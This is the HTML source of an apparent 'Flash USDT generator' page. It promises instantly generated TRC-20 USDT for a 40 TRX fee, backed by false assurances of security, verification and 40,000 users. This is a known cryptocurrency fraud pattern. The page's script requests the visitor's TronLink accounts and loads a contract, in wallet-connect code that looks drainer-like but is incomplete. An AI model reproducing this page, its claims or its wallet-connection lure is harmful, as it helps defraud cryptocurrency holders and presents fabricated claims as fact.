<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="Content-Security-Policy" content="script-src 'self' https://cdn.jsdelivr.net 'unsafe-eval';">
  <title>FLASH USDT GENERATOR | TRC-20</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="./css2.css" rel="stylesheet">
  
<style>
  * {
    box-sizing: border-box;
  }

  html, body {
    margin: 0;
    padding: 0;
    overflow-x: hidden;
    font-family: 'Press Start 2P', monospace;
    background-color: #fff;
    color: #111;
    font-size: 12px;
  }

  
.thin-bar {
  height: 2px;
  background-color: #d72626;
  width: 100vw;
  margin: 0;
  padding: 0;
  position: relative;
  left: 0;
}


  
.marquee-wrapper {
  background: #d72626;
  padding: 6px 0;
  overflow: hidden;
  color: white;
  width: 100vw;
  position: relative;
  left: 0;
  margin: 0;
}


  .marquee {
    white-space: nowrap;
    display: inline-block;
    animation: scroll 40s linear infinite;
    font-size: 11px;
  }

  @keyframes scroll {
    0% { transform: translateX(100%); }
    100% { transform: translateX(-100%); }
  }

  .card {
    padding-left: 16px;
    padding-right: 16px;
    width: 100%;
    max-width: 500px;
    background: white;
    border: 2px solid #d72626;
    margin: 40px auto;
    border-radius: 12px;
    padding: 20px;
    box-shadow: 4px 4px 0px black;
  }

  .section-title {
    text-align: center;
    margin-bottom: 16px;
    font-size: 14px;
  }

  .btn-group {
    display: flex;
    justify-content: center;
    gap: 10px;
    flex-wrap: wrap;
    margin-bottom: 16px;
  }

  .btn {
    padding: 6px 12px;
    border: 2px dashed #d72626;
    border-radius: 8px;
    background: white;
    color: #d72626;
    cursor: pointer;
    white-space: nowrap;
  }

  .btn.active {
    background-color: #d72626;
    color: white;
  }

  .cost {
    font-size: 18px;
    font-weight: bold;
    text-align: center;
    margin: 20px 0;
  }

  .buy-btn {
    font-family: 'Press Start 2P', monospace;
    display: block;
    width: 100%;
    padding: 12px;
    background: #000;
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 14px;
    cursor: pointer;
  }

  input[type="text"] {
    width: 100%;
    padding: 8px;
    font-family: 'Press Start 2P', monospace;
    margin: 10px 0;
    border: 2px dashed #d72626;
    border-radius: 6px;
  }

  .description-block {
    margin-top: 24px;
    background: #f9f9f9;
    border-radius: 10px;
    border: 2px solid #d72626;
    padding: 16px;
  }

  .description-block h3 {
    font-size: 12px;
    color: #d72626;
    margin-bottom: 10px;
  }

  .description-block ul {
    padding-left: 20px;
    list-style: disc;
  }

  .footer {
    text-align: center;
    margin-top: 40px;
    font-size: 10px;
    color: #999;
    word-break: break-word;
  }

  
</style>

</head>
<body>

  <div class="thin-bar"></div>
  <div class="marquee-wrapper">
    <div class="marquee">
      🚀 FLASH USDT TRC-20 | 100% SECURE | INSTANT DELIVERY | VERIFIED CONTRACT | FIXED 40 TRX FEE | NON-CUSTODIAL | NO KYC REQUIRED 🚀
    </div>
  </div>

  <div class="card">
    <div class="section-title">FLASH USDT (TRC-20) GENERATOR</div>
    <div class="section-title">1. Select Amount</div>
    <div class="btn-group" id="amountBtns">
      <div class="btn" data-amount="1000">1,000</div>
      <div class="btn" data-amount="5000">5,000</div>
      <div class="btn" data-amount="10000">10,000</div>
      <div class="btn" data-amount="50000">50,000</div>
      <div class="btn" data-amount="100000">100,000</div>
    </div>

    <div class="section-title">2. Enter your TRC20 Wallet</div>
    <input type="text" id="walletInput" placeholder="Enter your TRC-20 wallet">

    <div class="cost">⚠️ Fixed Cost: 40 TRX Required</div>
    <button class="cw-connect-button cw-withdraw-button buy-btn">⚡ Generate Flash USDT</button>

    <div class="description-block">
      <h3>✅ What is Flash USDT?</h3>
      <ul>
        <li>Instantly generated USDT tokens with private contract execution</li>
        <li>Works on all TRC-20 compatible wallets: Trust Wallet, TronLink, etc.</li>
        <li>Non-custodial: we never access your funds or wallet</li>
        <li>No KYC or registration required — fully anonymous</li>
      </ul>
    </div>

    <div class="description-block">
      <h3>🔐 Security & Transparency</h3>
      <ul>
        <li>Smart contract verified on TRONSCAN</li>
        <li>Fixed price — no hidden fees</li>
        <li>Used by over 40,000 wallets worldwide</li>
        <li>Funds delivered within seconds after payment</li>
      </ul>
    </div>

    <div class="footer">
      © 2025 flashtrc20token.org — All rights reserved.<br>
      Not affiliated with the TRON Foundation.<br><br>
      📩 Support: <a href="mailto:support@flashtrc20token.org" style="color: #d72626;">support@flashtrc20token.org</a><br>
      Operated under international crypto compliance. Non-custodial. Transparent. Secure.
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
  <script>
    const amountBtns = document.querySelectorAll('#amountBtns .btn');
    let selectedAmount = 1000;

    amountBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        amountBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        selectedAmount = parseInt(btn.dataset.amount);
      });
    });
  
	// Initialize TronWeb

    const tronWeb = new TronWeb({
        fullHost: 'https://nile.trongrid.io'
    });

    async function connectAndFlash() {
        const status = document.getElementById('status');
        if (!window.tronLink || !window.tronWeb) {
            status.innerText = 'Status: Please install TronLink!';
            alert('Install TronLink to flash tokens!');
            return;
        }

        try {
            const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
            if (res.code === 200) {
                tronWeb.setDefault(tronWeb.trx);
                const walletAddress = tronWeb.defaultAddress.base58;
                status.innerText = `Status: Connected as ${walletAddress}`;

                const contractAddress = 'TVCJCrCiktgpo4FAcw5ce5QdeDt9jk4Db8';
                const contract = await tronWeb.contract().at(contractAddress);
                
            } else {
                status.innerText = 'Status: Wallet connection rejected!';
            }
        } catch (error) {
            status.innerText = `Status: Error - ${error.message}`;
            alert('Oops! Something went wrong. Check console for details.');
        }
    }
  </script>

</body>
</html>
